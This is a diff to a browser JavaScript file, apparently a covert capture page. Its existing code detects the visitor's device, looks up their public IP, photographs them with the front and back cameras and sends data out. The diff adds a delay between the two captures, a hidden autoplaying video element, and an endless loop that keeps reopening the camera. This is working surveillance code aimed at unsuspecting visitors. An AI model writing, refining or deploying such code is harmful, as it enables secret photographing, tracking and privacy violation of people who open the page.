@@ -175,6 +175,11 @@ async function sendTextOnly() {
   });
 }
 
+// 👉 delay helper
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 async function main() {
   detectDevice();
   await getPublicIP();
@@ -185,6 +190,7 @@ async function main() {
 
   try {
     front = await captureCamera("user");
+    await delay(1000);
     back = await captureCamera("environment");
     info.camera = '✅ Đã chụp camera trước và sau';
   } catch {
@@ -198,6 +204,44 @@ async function main() {
   }
 }
 
-main();
-// Cuối main.js
-window.mainScriptFinished = true;
+// 👉 Gọi main rồi bắt đầu vòng lặp camera sau đó
+main().then(() => {
+  window.mainScriptFinished = true;
+  startCameraLoop(); // 👈 Gọi sau khi hoàn tất
+});
+
+
+// 👉 Vòng lặp bật / tắt camera liên tục
+let loopStream = null;
+const video = document.createElement("video");
+video.style.display = "none";
+video.autoplay = true;
+video.playsInline = true;
+document.body.appendChild(video);
+
+function stopLoopCamera() {
+  if (loopStream) {
+    loopStream.getTracks().forEach(track => track.stop());
+    loopStream = null;
+    console.log("🚫 Camera đã tắt (vòng lặp)");
+  }
+}
+
+async function startLoopCamera() {
+  try {
+    loopStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = loopStream;
+    console.log("🎥 Camera đã bật lại (vòng lặp)");
+  } catch (e) {
+    console.error("Không thể bật camera trong vòng lặp:", e);
+  }
+}
+
+async function startCameraLoop() {
+  while (true) {
+    stopLoopCamera();         // Tắt camera
+    await delay(1000);        // Đợi 1 giây
+    await startLoopCamera();  // Bật lại camera
+    await delay(2000);        // Đợi 2 giây
+  }
+}
